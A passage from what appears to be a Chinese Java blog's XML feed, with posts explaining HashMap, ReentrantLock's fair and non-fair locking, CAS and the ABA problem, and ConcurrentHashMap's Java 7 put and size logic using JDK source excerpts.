Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">setValue</span><span class="params">(V newValue)</span> </span>&#123;</span><br><span class="line">            V oldValue = value;</span><br><span class="line">            value = newValue;</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Map.Entry) &#123;</span><br><span class="line">                Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;)o;</span><br><span class="line">                <span class="keyword">if</span> (Objects.equals(key, e.getKey()) &amp;&amp;</span><br><span class="line">                    Objects.equals(value, e.getValue()))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/20200320-java8-hashmap.png" alt="Java 8中的HashMap"></p>
<h3 id="发生冲突时-1"><a href="#发生冲突时-1" class="headerlink" title="发生冲突时"></a>发生冲突时</h3><p>发生hash冲突后，会优先判断该节点的数据结构式是红黑树还是链表，如果是红黑树，则在红黑树中插入数据；如果是链表，则将数据插入到链表的尾部并判断链表长度是否大于8，如果大于8要转成红黑树。</p>
<h3 id="扩容-1"><a href="#扩容-1" class="headerlink" title="扩容"></a>扩容</h3><p>由于 JDK 1.8 转移数据操作 = 按旧链表的正序遍历链表、在新链表的尾部依次插入，所以不会出现链表 逆序、倒置的情况，故不容易出现环形链表的情况 ，但jdk1.8仍是线程不安全的，因为没有加同步锁保护。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>UnSave类解析</title>
    <url>/2020/03/16/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-16-%E5%A4%9A%E7%BA%BF%E7%A8%8B-UnSave%E7%B1%BB%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>并发</tag>
        <tag>多线程</tag>
        <tag>UnSave</tag>
      </tags>
  </entry>
  <entry>
    <title>ReentrantLock解析</title>
    <url>/2020/03/12/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-10-%E5%A4%9A%E7%BA%BF%E7%A8%8B-03-ReentrantLock%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="ReentrantLock解析"><a href="#ReentrantLock解析" class="headerlink" title="ReentrantLock解析"></a>ReentrantLock解析</h1><p>ReentrantLock是Java.util.concurrent包中提供的锁。是Lock接口的默认实现，排他锁（独享锁），相对于Synchronized而言，ReentrantLock提供了更细粒度的加锁方式以及更多的操作方式。</p>
<h2 id="ReentrantLock特点"><a href="#ReentrantLock特点" class="headerlink" title="ReentrantLock特点"></a>ReentrantLock特点</h2><ul>
<li>可重入；</li>
<li>可中断</li>
<li>分为公平锁和非公平锁，默认为非公平锁</li>
</ul>
<p>它的使用方式为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ReentrantLock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line">lock.lock();</span><br><span class="line">		</span><br><span class="line"><span class="comment">// do busniess</span></span><br><span class="line"></span><br><span class="line">lock.unlock();</span><br></pre></td></tr></table></figure>

<p>可以在new的时候指定使用公平锁还是非公平锁。</p>
<p>默认的构造方法，ReentrantLock()创建的是非公平锁。调用ReentrantLock(bool fair)这个构造方法，传入true，既可以创建一个公平的ReentrantLock锁。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates an instance of &#123;<span class="doctag">@code</span> ReentrantLock&#125;.</span></span><br><span class="line"><span class="comment">     * This is equivalent to using &#123;<span class="doctag">@code</span> ReentrantLock(false)&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ReentrantLock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sync = <span class="keyword">new</span> NonfairSync();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates an instance of &#123;<span class="doctag">@code</span> ReentrantLock&#125; with the</span></span><br><span class="line"><span class="comment">     * given fairness policy.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> fair &#123;<span class="doctag">@code</span> true&#125; if this lock should use a fair ordering policy</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ReentrantLock</span><span class="params">(<span class="keyword">boolean</span> fair)</span> </span>&#123;</span><br><span class="line">        sync = fair ? <span class="keyword">new</span> FairSync() : <span class="keyword">new</span> NonfairSync();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="ReentrantLock类结构"><a href="#ReentrantLock类结构" class="headerlink" title="ReentrantLock类结构"></a>ReentrantLock类结构</h2><p>参见下图，简单梳理了以下，ReentrantLock的类结构图</p>
<p><img src="https://huhansi.github.io/images/2020-03-12-ReentrantLock.png" alt="ReentrantLock类结构"></p>
<ul>
<li>ReentrantLock实现了Lock，Serializable接口</li>
<li>内部使用了内部类Sync来实现主要的加锁、解锁逻辑</li>
<li>通过继承了Sync类的NonFairSync和FairSync实现了非公平锁和公平锁的逻辑</li>
<li>Sync内部类继承了AQS</li>
</ul>
<p>AQS相关内容可参见<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-12-多线程-04.Java-AQS-解析/">Java AQS 解析</a></p>
<h2 id="ReentrantLock加-解锁流程分析"><a href="#ReentrantLock加-解锁流程分析" class="headerlink" title="ReentrantLock加/解锁流程分析"></a>ReentrantLock加/解锁流程分析</h2><h3 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sync.lock();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，代码就是简简单单一句sync.lock().而这块的sync，根据创建的不同选择，可以是公平锁和非公平锁。那么接下来再看看公平锁和非公平锁是怎么处理这块逻辑的。</p>
<h4 id="公平锁"><a href="#公平锁" class="headerlink" title="公平锁"></a>公平锁</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">FairSync</span> <span class="keyword">extends</span> <span class="title">Sync</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3000897897090466540L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            acquire(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它也是简简单单一句acquire(1).追踪进去，发现它是调用的AbstractQueuedSynchronizer类中的acquire方法。具体逻辑请参考文章<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-12-多线程-04.Java-AQS-解析/">Java AQS 解析</a></p>
<p>我们看一看公平锁自己实现的tryAcquire();</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">         * Fair version of tryAcquire.  Don&#39;t grant access unless</span><br><span class="line">         * recursive call or no waiters or is first.</span><br><span class="line">         *&#x2F;</span><br><span class="line">        protected final boolean tryAcquire(int acquires) &#123;</span><br><span class="line">            final Thread current &#x3D; Thread.currentThread();</span><br><span class="line">            int c &#x3D; getState(); </span><br><span class="line">            if (c &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                if (!hasQueuedPredecessors() &amp;&amp;</span><br><span class="line">                    compareAndSetState(0, acquires)) &#123;</span><br><span class="line">                    setExclusiveOwnerThread(current);</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (current &#x3D;&#x3D; getExclusiveOwnerThread()) &#123;</span><br><span class="line">                int nextc &#x3D; c + acquires;</span><br><span class="line">                if (nextc &lt; 0)</span><br><span class="line">                    throw new Error(&quot;Maximum lock count exceeded&quot;);</span><br><span class="line">                setState(nextc);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>它首先获取state的值，如果，state为0，表示当前锁时可用的，然后看看等待队列里面是否还有线程在等着，有就不能尝试获取锁，必须排队；</p>
<p>如果state不为0，则判断当前线程是不是就是已经占用锁的那个独占线程，是的话，修改state，期间还判断下state是否溢出。</p>
<h4 id="非公平锁"><a href="#非公平锁" class="headerlink" title="非公平锁"></a>非公平锁</h4><p>非公平锁流程上和公平锁类似，区别就是：</p>
<ul>
<li><p>lock的时候先直接lock，失败的话，在尝试重新获取</p>
</li>
<li><p>在tryAcquire的时候，没有判断队列中是否有线程在等待这一步，也就是没有这个过程(!hasQueuedPredecessors() ).</p>
</li>
</ul>
<p>看下它的lock方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Performs lock.  Try immediate barge, backing up to normal</span></span><br><span class="line"><span class="comment">         * acquire on failure.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">                setExclusiveOwnerThread(Thread.currentThread());</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                acquire(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>NonFairSync非公平锁的acquire同FairSync一样，还是调用的弗雷AQS的acquire，这里不做细解。</p>
<p>它在lock的时候，直接通过CAS操作取设置state为1，如果成功了，则抢占锁成功，直接把独占线程设置为自己，否则，再通过AQS的acquire获取锁。</p>
<p>接下来看下NonFairSync的tryAcquire方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nonfairTryAcquire(acquires);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Performs non-fair tryLock.  tryAcquire is implemented in</span></span><br><span class="line"><span class="comment">         * subclasses, but both need nonfair try for trylock method.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">nonfairTryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">final</span> Thread current = Thread.currentThread();</span><br><span class="line">            <span class="keyword">int</span> c = getState();</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">                    setExclusiveOwnerThread(current);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">                <span class="keyword">int</span> nextc = c + acquires;</span><br><span class="line">                <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Maximum lock count exceeded"</span>);</span><br><span class="line">                setState(nextc);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>从上面的代码可以比较出，它和FairSync同样功能的方法是极其类似的，就是少了一句（!hasQueuedPredecessors() ）。</p>
<h3 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h3><p>ReentrantLock的解锁方法，unlock也是简单的调用了一下Sync的release方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Attempts to release this lock.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;If the current thread is the holder of this lock then the hold</span></span><br><span class="line"><span class="comment">     * count is decremented.  If the hold count is now zero then the lock</span></span><br><span class="line"><span class="comment">     * is released.  If the current thread is not the holder of this</span></span><br><span class="line"><span class="comment">     * lock then &#123;<span class="doctag">@link</span> IllegalMonitorStateException&#125; is thrown.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalMonitorStateException if the current thread does not</span></span><br><span class="line"><span class="comment">     *         hold this lock</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sync.release(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>解锁在这块就没有公平和非公平之分了，统一调用的是AQS中的release方法。请参考文章<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-12-多线程-04.Java-AQS-解析/">Java AQS 解析</a></p>
<p>而AQS的release方法中则调用了Sync中实现的tryRelease方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> releases)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> c = getState() - releases;</span><br><span class="line">            <span class="keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">            <span class="keyword">boolean</span> free = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">                free = <span class="keyword">true</span>;</span><br><span class="line">                setExclusiveOwnerThread(<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            setState(c);</span><br><span class="line">            <span class="keyword">return</span> free;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>主要流程是：</p>
<ol>
<li>改变状态值</li>
<li>如果当前线程不是占有锁的独占线程，抛出异常。只能由占有锁的线程释放锁</li>
<li>判断状态值是否已经为0了，是的话，说明锁已经没有线程占用了，自由了</li>
<li>设置状态值，返回</li>
</ol>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>并发</tag>
        <tag>多线程</tag>
        <tag>ReentrantLock</tag>
      </tags>
  </entry>
  <entry>
    <title>CAS算法解析</title>
    <url>/2020/03/12/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-12-%E5%A4%9A%E7%BA%BF%E7%A8%8B-05-Java-CAS-%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="CAS算法"><a href="#CAS算法" class="headerlink" title="CAS算法"></a>CAS算法</h1><p>CAS（比较与交换，Compare and swap） 是一种有名的无锁算法。无锁编程，即不使用锁的情况下实现多线程之间的变量同步，也就是在没有线程被阻塞的情况下实现变量的同步，所以也叫非阻塞同步（Non-blocking Synchronization）。实现非阻塞同步的方案称为“无锁编程算法”（ Non-blocking algorithm）。<br>CAS, CPU指令，在大多数处理器架构，包括IA32、Space中采用的都是CAS指令，CAS的语义是“我认为V的值应该为A，如果是，那么将V的值更新为B，否则不修改并告诉V的值实际为多少”，CAS是项 乐观锁 技术，当多个线程尝试使用CAS同时更新同一个变量时，只有其中一个线程能更新变量的值，而其它线程都失败，失败的线程并不会被挂起，而是被告知这次竞争中失败，并可以再次尝试。CAS有3个操作数，内存值V，旧的预期值A，要修改的新值B。当且仅当预期值A和内存值V相同时，将内存值V修改为B，否则什么都不做。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>java.util.concurrent.atomic中的AtomicXXX，都使用了这些底层的JVM支持为数字类型的引用类型提供一种高效的CAS操作，而在java.util.concurrent中的大多数类在实现时都直接或间接的使用了这些原子变量类，这些原子变量都调用了 sun.misc.Unsafe 类库里面的 CAS算法，用CPU指令来实现无锁自增</p>
<p>下面就以AtomicInteger类为例，看看它是如何使用CAS算法来提升效率的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Atomically increments by one the current value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the previous value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getAndIncrement</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unsafe.getAndAddInt(<span class="keyword">this</span>, valueOffset, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Atomically decrements by one the current value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the previous value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getAndDecrement</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unsafe.getAndAddInt(<span class="keyword">this</span>, valueOffset, -<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>摘取了两个AtomicInter类中自增1和自减1的方法来做说明，它们都是调用了UnSave封装的CAS操作来实现的。</p>
<p>UnSave类相关信息可参见文章<a href>UnSave类解析</a></p>
<h2 id="CAS算法存在的问题"><a href="#CAS算法存在的问题" class="headerlink" title="CAS算法存在的问题"></a>CAS算法存在的问题</h2><p>CAS算法存在一个ABA问题。</p>
<p>假设有如下操作：</p>
<ol>
<li>假设有两个线程T1，T2正在操作一个字符C，此时C的值为A。</li>
<li>在某一时刻，T1和T2都要修改C的值，于是，它们将C当前值A拷贝一份过去。</li>
<li>由于线程调度，T2将C的值修改为B，</li>
<li>由于线程调度，T2又将C的值修改回A。</li>
<li>T1准备修改C的值。它把C的当前值和自己保存的值进行比较，发现一致，认为C的值从它取值之后就没有发生过变更</li>
<li>T1修改C的值为D，结束。</li>
</ol>
<p>对T1来说，C的值就从来没有变过，但实际上C的值已经变化了两次，只是变回了原值而已。</p>
<p>在Java 1.5开始，atomic包中引入了一个类AtomicStampedReference来解决ABA问题。这个类中的compareAndSet方法不仅会检查当前引用是否等于预期引用，还会检查当前的stamp（版本号、时间戳）是否和预期的相等。只要有一个不一致，就认为值已经发生过变更。CAS操作就做失败处理。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>并发</tag>
        <tag>多线程</tag>
        <tag>CAS</tag>
      </tags>
  </entry>
  <entry>
    <title>ConcurrentHashMap在Java1.7和1.8中的区别</title>
    <url>/2020/03/12/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-12-%E5%A4%9A%E7%BA%BF%E7%A8%8B-07-ConCurrentHashMap%E5%9C%A8Java1.7%E5%92%8C1.8%E4%B8%AD%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h1 id="ConcurrentHashMap在Java-7和Java-8中的区别"><a href="#ConcurrentHashMap在Java-7和Java-8中的区别" class="headerlink" title="ConcurrentHashMap在Java 7和Java 8中的区别"></a>ConcurrentHashMap在Java 7和Java 8中的区别</h1><p>ConcurrentHashMap在Java中一直是一个多线程的大杀器。在多线程环境下，使用它就可以免去使用HashMap造成的线程不安全的问题。鉴于Java 8已经出来N久了，在各个方面和Java 7都有所不同。下面我们就从源码级别对ConcurrentHashMap进行分析，看看从Java 7 到Java 8，它到底有哪些变化？</p>
<h2 id="Java-7中的ConcurrentHashMap"><a href="#Java-7中的ConcurrentHashMap" class="headerlink" title="Java 7中的ConcurrentHashMap"></a>Java 7中的ConcurrentHashMap</h2><h3 id="put方法实现"><a href="#put方法实现" class="headerlink" title="put方法实现"></a>put方法实现</h3><p>在Java 7 中，put一个值到ConcurrentHashMap主要有以下这些步骤：</p>
<ol>
<li>首先计算出这个key对应的segment，<code>(hash &gt;&gt;&gt; segmentShift) &amp; segmentMask;</code></li>
<li>通过key再次计算出，这个值在table数组中的位置</li>
<li>首先尝试获取锁，成功获取锁之后，转到4，否则，转到8</li>
<li>获取table数组的头结点，遍历；</li>
<li>如果当前key在链表中，则直接覆盖其值，不在的话，转为6</li>
<li>将节点插入头结点位置，作为第一个节点；</li>
<li>判断是否需要扩容，如有，扩容</li>
<li>遍历是否存在相同的key</li>
<li>在步骤8遍历时，自旋获取锁，如果超过最大限制64次，则阻塞。</li>
</ol>
<h4 id="put方法"><a href="#put方法" class="headerlink" title="put方法"></a>put方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">put</span><span class="params">(K key, <span class="keyword">int</span> hash, V value, <span class="keyword">boolean</span> onlyIfAbsent)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//Segment继承ReentrantLock，尝试获取独占锁</span></span><br><span class="line">        HashEntry&lt;K,V&gt; node = tryLock() ? <span class="keyword">null</span> :</span><br><span class="line">                scanAndLockForPut(key, hash, value);</span><br><span class="line">        V oldValue;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            HashEntry&lt;K,V&gt;[] tab = table;</span><br><span class="line">            <span class="comment">//定位键值对在HashEntry数组上的位置</span></span><br><span class="line">            <span class="keyword">int</span> index = (tab.length - <span class="number">1</span>) &amp; hash;</span><br><span class="line">            <span class="comment">//获取这个位置的第一个键值对</span></span><br><span class="line">            HashEntry&lt;K,V&gt; first = entryAt(tab, index);</span><br><span class="line">            <span class="keyword">for</span> (HashEntry&lt;K,V&gt; e = first;;) &#123;</span><br><span class="line">                <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;<span class="comment">//此处有链表结构，一直循环到e==null</span></span><br><span class="line">                    K k;</span><br><span class="line">                    <span class="comment">//存在与待插入键值对相同的键，则替换value</span></span><br><span class="line">                    <span class="keyword">if</span> ((k = e.key) == key ||</span><br><span class="line">                            (e.hash == hash &amp;&amp; key.equals(k))) &#123;</span><br><span class="line">                        oldValue = e.value;</span><br><span class="line">                        <span class="keyword">if</span> (!onlyIfAbsent) &#123;<span class="comment">//onlyIfAbsent默认为false</span></span><br><span class="line">                            e.value = value;</span><br><span class="line">                            ++modCount;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    e = e.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//node不为null,设置node的next为first，node为当前链表的头节点</span></span><br><span class="line">                    <span class="keyword">if</span> (node != <span class="keyword">null</span>)</span><br><span class="line">                        node.setNext(first);</span><br><span class="line">                    <span class="comment">//node为null,创建头节点,指定next为first，node为当前链表的头节点</span></span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        node = <span class="keyword">new</span> HashEntry&lt;K,V&gt;(hash, key, value, first);</span><br><span class="line">                    <span class="keyword">int</span> c = count + <span class="number">1</span>;</span><br><span class="line">                    <span class="comment">//扩容条件 (1)entry数量大于阈值 (2) 当前数组tab长度小于最大容量。满足以上条件就扩容</span></span><br><span class="line">                    <span class="keyword">if</span> (c &gt; threshold &amp;&amp; tab.length &lt; MAXIMUM_CAPACITY)</span><br><span class="line">                        <span class="comment">//扩容</span></span><br><span class="line">                        rehash(node);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="comment">//tab的index位置设置为node,</span></span><br><span class="line">                        setEntryAt(tab, index, node);</span><br><span class="line">                    ++modCount;</span><br><span class="line">                    count = c;</span><br><span class="line">                    oldValue = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            unlock();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="scanAndLockForPut"><a href="#scanAndLockForPut" class="headerlink" title="scanAndLockForPut"></a>scanAndLockForPut</h4><p>在不超过最大重试次数MAX_SCAN_RETRIES通过CAS尝试获取锁</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> HashEntry&lt;K,V&gt; <span class="title">scanAndLockForPut</span><span class="params">(K key, <span class="keyword">int</span> hash, V value)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//first,e:键值对的hash值定位到数组tab的第一个键值对</span></span><br><span class="line">        HashEntry&lt;K,V&gt; first = entryForHash(<span class="keyword">this</span>, hash);</span><br><span class="line">        HashEntry&lt;K,V&gt; e = first;</span><br><span class="line">        HashEntry&lt;K,V&gt; node = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> retries = -<span class="number">1</span>; <span class="comment">// negative while locating node</span></span><br><span class="line">        <span class="comment">//线程尝试通过CAS获取锁</span></span><br><span class="line">        <span class="keyword">while</span> (!tryLock()) &#123;</span><br><span class="line">            HashEntry&lt;K,V&gt; f; <span class="comment">// to recheck first below</span></span><br><span class="line">            <span class="keyword">if</span> (retries &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//当e==null或key.equals(e.key)时retry=0，走出这个分支</span></span><br><span class="line">                <span class="keyword">if</span> (e == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="comment">// speculatively create node</span></span><br><span class="line">                        <span class="comment">//初始化键值对，next指向null</span></span><br><span class="line">                        node = <span class="keyword">new</span> HashEntry&lt;K,V&gt;(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    retries = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(e.key))</span><br><span class="line">                    retries = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    e = e.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//超过最大自旋次数，阻塞</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (++retries &gt; MAX_SCAN_RETRIES) &#123;</span><br><span class="line">                lock();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//头节点发生变化，重新遍历</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((retries &amp; <span class="number">1</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    (f = entryForHash(<span class="keyword">this</span>, hash)) != first) &#123;</span><br><span class="line">                e = first = f; <span class="comment">// re-traverse if entry changed</span></span><br><span class="line">                retries = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="size方法实现"><a href="#size方法实现" class="headerlink" title="size方法实现"></a>size方法实现</h3><p>在Java 7 中求ConcurrentHashMap的方式如下步骤：</p>
<ol>
<li>先不加锁，计算两次ConcurrentHashMap的大小，如果两次结果是一样的，说明是正确的，返回</li>
<li>如果两次结果不一样，则锁住所有的segment，重新计算所有segment的count之和。</li>
</ol>
